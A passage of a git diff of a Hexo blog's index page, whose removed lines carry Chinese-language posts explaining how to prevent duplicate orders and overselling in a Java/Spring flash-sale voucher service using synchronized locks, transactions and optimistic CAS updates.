@@ -1,1394 +1,328 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"xudong7.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta property="og:type" content="website">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Dunjia&#39;s Blog">
 <meta property="og:url" content="https://xudong7.github.io/index.html">
 <meta property="og:site_name" content="Dunjia&#39;s Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Dunjia">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://xudong7.github.io/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'en'
-  };
-</script>
-
-  <title>Dunjia's Blog</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Dunjia's Blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result">
-  <div id="no-result">
-    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-    </header>
-
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
+    
       
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/18/%E4%B8%80%E4%BA%BA%E4%B8%80%E5%8D%95%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/18/%E4%B8%80%E4%BA%BA%E4%B8%80%E5%8D%95%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">一人一单问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-18 14:47:58 / Modified: 15:43:29" itemprop="dateCreated datePublished" datetime="2025-03-18T14:47:58+08:00">2025-03-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是一人一单"><a href="#什么是一人一单" class="headerlink" title="什么是一人一单"></a>什么是一人一单</h2><p>一人一单是指每个用户只能购买一次商品，这种情况通常发生在限购活动中，比如双十一、618等大促销活动。一人一单的原因主要是为了防止用户恶意刷单，导致库存不足。</p>
-<h2 id="如何解决一人一单问题"><a href="#如何解决一人一单问题" class="headerlink" title="如何解决一人一单问题"></a>如何解决一人一单问题</h2><p>查询数据库中对应订单记录数量，如果大于0则表示用户已经购买过，不能再次购买。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 一人一单</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.1 查询订单 会有并发问题</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户已经购买过</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;用户已经购买过一次!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line"><span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 原子性操作 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 7.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 7.2 用户id</span></span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 7.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用jmeter进行压测，发现存在并发问题，即多个请求同时进入时，会导致用户购买多次。</p>
-<p>为什么会出现这种情况呢？因为query()查询订单记录不会有数据库锁进行隔离，会存在并发问题。</p>
-<p>当第一次请求进入时，查询订单记录数量为0，此时其他请求也进入，查询订单记录数量也为0，然后多个请求都执行扣减库存操作，导致用户购买多次。</p>
-<h2 id="如何解决并发问题"><a href="#如何解决并发问题" class="headerlink" title="如何解决并发问题"></a>如何解决并发问题</h2><p>加锁解决并发问题，保证查询订单记录和扣减库存操作的原子性。</p>
-<p>使用悲观锁来处理：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 悲观锁 防止刷单购买</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    <span class="keyword">synchronized</span> (userId.toString().intern()) &#123;</span><br><span class="line">        <span class="comment">// 获取代理对象(事务)</span></span><br><span class="line">        <span class="type">IVoucherOrderService</span> <span class="variable">proxy</span> <span class="operator">=</span> (IVoucherOrderService) AopContext.currentProxy();</span><br><span class="line">        <span class="comment">// 如果不获取代理对象，会调用this.func导致事务失效</span></span><br><span class="line">        <span class="comment">// 因为spring通过代理模式来实现事务，如果直接调用this.func，那么就不会走代理，导致事务失效</span></span><br><span class="line">        <span class="keyword">return</span> proxy.createVoucherOrder(voucherId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">createVoucherOrder</span><span class="params">(Long voucherId)</span> &#123; <span class="comment">// 注意，不能加方法锁，会导致串行化，性能下降</span></span><br><span class="line">    <span class="comment">// 5. 一人一单</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 锁定用户id 使用intern来保证锁的唯一性</span></span><br><span class="line"><span class="comment">//        // intern 如果常量池中有则返回常量池中的对象，如果没有则放入常量池并返回</span></span><br><span class="line"><span class="comment">//        // 但是这里会有问题，因为如果锁释放了，但是事务还没有提交，那么其他线程就可以获取到锁，导致并发问题</span></span><br><span class="line"><span class="comment">//        // 所以sync要放在事务外面 但是不能放在方法上，因为会导致串行化</span></span><br><span class="line"><span class="comment">//        synchronized (userId.toString().intern()) &#123;</span></span><br><span class="line">    <span class="comment">// 5.1 查询订单(非原子操作) 会有并发问题</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户已经购买过</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;用户已经购买过一次!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line">            <span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 原子性操作 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 7.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 7.2 用户id</span></span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 7.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意，使用sync锁定用户id，但是不能放在方法上，因为会导致串行化，性能下降。</p>
-<p>并且，userId要使用intern来保证锁的唯一性，intern会在常量池中查找是否存在该对象，如果存在则返回常量池中的对象，如果不存在则放入常量池并返回。如果不使用intern，那么每次都会创建新的对象，导致锁失效。</p>
-<p>同时，方法使用@Transactional注解，保证事务的一致性。</p>
-<p>由于spring通过代理模式来实现事务，如果直接调用this.func，那么就不会走代理，导致事务失效，所以这里使用代理对象来调用createVoucherOrder方法。</p>
-<p>如何获取代理对象呢？通过AopContext.currentProxy()来获取代理对象。</p>
-<p>注意添加注解让代理对象暴露出来：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableAspectJAutoProxy(exposeProxy = true)</span></span><br></pre></td></tr></table></figure>
-
-<p>同时别忘了修改pom.xml：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>进行jmeter压测，发现并发问题得到解决，用户只能购买一次商品。</p>
-<p><img src="/images/image20.png" alt="alt text"></p>
-<p>数据库显示：</p>
-<p><img src="/images/image21.png" alt="alt text"></p>
-<p>显示成功，用户只能购买一次商品。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/18/%E8%B6%85%E5%8D%96%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/18/%E8%B6%85%E5%8D%96%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">超卖问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-18 12:38:46 / Modified: 15:44:06" itemprop="dateCreated datePublished" datetime="2025-03-18T12:38:46+08:00">2025-03-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是超卖"><a href="#什么是超卖" class="headerlink" title="什么是超卖"></a>什么是超卖</h2><p>超卖是指卖出的商品数量超过了实际库存数量，这种情况通常发生在高并发的电商网站上，比如双十一、618等大促销活动。超卖的原因主要是多线程并发操作数据库时，没有对库存数量进行加锁，导致多个线程同时读取库存数量，然后都判断库存数量足够，最后都执行了减库存操作，导致库存数量变为负数。</p>
-<h2 id="如何解决超卖问题"><a href="#如何解决超卖问题" class="headerlink" title="如何解决超卖问题"></a>如何解决超卖问题</h2><p>加锁是解决超卖问题的常用方法</p>
-<h3 id="锁的种类"><a href="#锁的种类" class="headerlink" title="锁的种类"></a>锁的种类</h3><ul>
-<li><p><strong>悲观锁</strong>：悲观锁认为线程安全问题一定会发生，所以在操作数据之前先加锁，操作完成后再释放锁。串行化处理，效率低。</p>
-</li>
-<li><p><strong>乐观锁</strong>：乐观锁认为线程安全问题不一定会发生，所以在操作数据之前不加锁，只是在更新数据时判断数据是否被其他线程修改过，如果没有修改过则更新成功，否则更新失败。</p>
-</li>
-</ul>
-<p>对于超卖问题，乐观锁更适合，因为超卖问题不是一定会发生的，只有在多个线程同时读取库存数量时才会发生，所以只需要在更新库存数量时判断库存数量是否足够即可。</p>
-<h3 id="乐观锁的实现方式"><a href="#乐观锁的实现方式" class="headerlink" title="乐观锁的实现方式"></a>乐观锁的实现方式</h3><p>关键在于判断数据是否被其他线程修改过，一般有两种方式：</p>
-<p><img src="/images/image18.png" alt="alt text"></p>
-<ul>
-<li><strong>版本号</strong>：给数据表增加一个版本号字段，每次更新数据时将版本号加1，更新数据时判断版本号是否一致，如果一致则更新成功，否则更新失败。</li>
-</ul>
-<p><img src="/images/image19.png" alt="alt text"></p>
-<ul>
-<li><strong>CAS（Compare And Swap）</strong>：使用CAS指令更新数据，CAS指令是一种原子操作，可以保证数据的一致性。每次更新数据时，先读取数据的值，然后比较数据的值是否和预期值一致，如果一致则更新数据，否则更新失败。</li>
-</ul>
-<p>注意，如果单纯使用CAS指令更新数据，可能会导致ABA问题，即数据的值被修改两次，但是版本号没有变化，所以需要使用版本号来解决ABA问题。</p>
-<h4 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h4><p>如果库存值从A变成B再变成A，那么CAS操作会认为库存值没有变化，但实际上库存值已经发生了变化，这就是ABA问题。</p>
-<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>这里单纯使用CAS指令更新数据，不考虑ABA问题。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> 